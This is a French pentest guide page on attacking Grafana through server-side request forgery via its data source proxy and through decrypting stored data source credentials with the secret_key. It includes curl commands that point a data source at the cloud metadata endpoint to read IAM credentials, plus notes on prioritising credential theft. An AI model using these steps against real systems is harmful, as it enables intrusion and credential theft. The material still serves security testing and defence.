---
order: 3
title: "SSRF des sources de données et identifiants : abuser des connexions de Grafana"
description: "Grafana proxifie les requêtes vers ses sources de données à travers le serveur, ce qu'un attaquant ayant un accès transforme en falsification de requête côté serveur pour atteindre des services internes, et Grafana stocke les identifiants des sources de données (chiffrés avec une clé dans grafana.ini). Récupérer et déchiffrer ces identifiants donne un accès direct aux bases de données et services auxquels Grafana se connecte."
keywords:
  - grafana ssrf
  - proxy de source de données
  - identifiants stockés
  - secret_key
  - services internes
---

# SSRF des sources de données et identifiants

Deux attaques de sources de données liées découlent de l'accès à Grafana. D'abord, le proxy de source de données : Grafana interroge les sources de données côté serveur (donc le navigateur ne les contacte jamais directement), et un attaquant qui peut configurer ou interroger une source de données dirige ces requêtes vers des adresses internes arbitraires, une falsification de requête côté serveur qui atteint des services internes depuis l'hôte Grafana (métadonnées cloud, API internes, bases de données). Ensuite, les identifiants stockés : Grafana enregistre les identifiants de chaque source de données dans sa base de données, chiffrés avec la `secret_key` de `grafana.ini`. Un attaquant qui lit la base de données et la clé (via la [traversée de chemin](path-traversal-file-read.md), un accès aux fichiers, ou un export admin) les déchiffre en identifiants en clair pour chaque base de données et service connecté, un accès direct à ce que Grafana visualise, qui sont souvent les magasins de données les plus précieux.

```bash
# SSRF: point a data source (or a proxied query) at an internal target via the Grafana server
#   create/edit a data source with url=http://169.254.169.254/... or an internal service,
#   then query it; Grafana fetches it server-side and returns the response
curl -sk -b cj -X POST https://<target>:3000/api/datasources -H 'Content-Type: application/json' \
  -d '{"name":"x","type":"prometheus","url":"http://169.254.169.254/latest/meta-data/","access":"proxy"}'
curl -sk -b cj 'https://<target>:3000/api/datasources/proxy/<id>/latest/meta-data/iam/security-credentials/'
# stored credentials: data_source table secrets are AES-encrypted with secret_key (grafana.ini)
#   recover grafana.db + secret_key, then decrypt the secureJsonData / password fields
```

## Notes d'exploitation

- La SSRF du proxy atteint tout ce que le serveur Grafana peut atteindre (métadonnées cloud pour les identifiants d'instance, services internes uniquement, ports de bases de données) ; les sources de données en `access: proxy` sont récupérées côté serveur, donc cela contourne les restrictions réseau sur l'attaquant.
- Les identifiants de sources de données stockés sont le plus gros butin : les déchiffrer avec la `secret_key` donne des logins directs aux bases de données et services (souvent les magasins de données primaires) auxquels Grafana se connecte, sans SSRF nécessaire.
- Récupérer la base de données et la clé se fait via la [traversée de chemin](path-traversal-file-read.md), un accès aux fichiers depuis l'exécution de code, ou un export de niveau admin ; le déchiffrement utilise le schéma AES connu de Grafana, avec `secret_key` comme clé.
- Les deux routes transforment un point d'appui dans Grafana en accès à l'environnement plus large avec lequel il s'intègre ; priorisez le déchiffrement des identifiants pour un accès durable.

## Références

- [Grafana: data source permissions and proxy](https://grafana.com/docs/grafana/latest/administration/data-source-management/)
- [HackTricks: Grafana SSRF/credentials](https://book.hacktricks.xyz/network-services-pentesting/3000-pentesting-grafana)
